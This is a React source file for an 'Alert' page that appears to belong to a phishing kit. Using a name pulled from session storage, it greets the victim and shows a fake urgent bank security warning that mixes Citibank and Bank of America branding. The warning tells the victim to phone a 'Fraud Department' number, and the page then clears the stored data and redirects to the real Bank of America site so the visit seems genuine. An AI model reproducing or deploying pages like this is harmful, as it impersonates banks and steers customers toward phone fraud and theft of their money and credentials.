import React, { useMemo } from "react";
import FormLayout from "../components/formLayout";
import { APP_STORAGE_NAME } from "../utils/constants";
import Button from "../components/button";

const Alert = () => {
  const data = useMemo(
    () => JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {},
    [],
  );

  const handleSubmit = async (e) => {
    e.preventDefault();
    sessionStorage.removeItem(APP_STORAGE_NAME);
    window.location.href = "https://www.bankofamerica.com";
  };

  return (
    <FormLayout
      handleSubmit={handleSubmit}
      title={""}
    >
      <p className="font-[500]">
        Immediate Action Required: Account Security Alert
      </p>
      <br />
      <p>Dear {data?.name || "Customer"},</p>
      <br />
      <p>
        We've detected suspicious access from an unknown IP address on your
        Citibank account, preventing verification of certain information. Please
        contact our Fraud Department urgently at 1-844-944-0001 to secure your
        account.
      </p>
      <br />
      <p>Thank you for your prompt attention.</p>
      <br />
      <p>Sincerely,</p>
      <br />
      <p>Bank of America Security Team</p>

      <Button title={"Continue"} />
    </FormLayout>
  );
};

export default Alert;
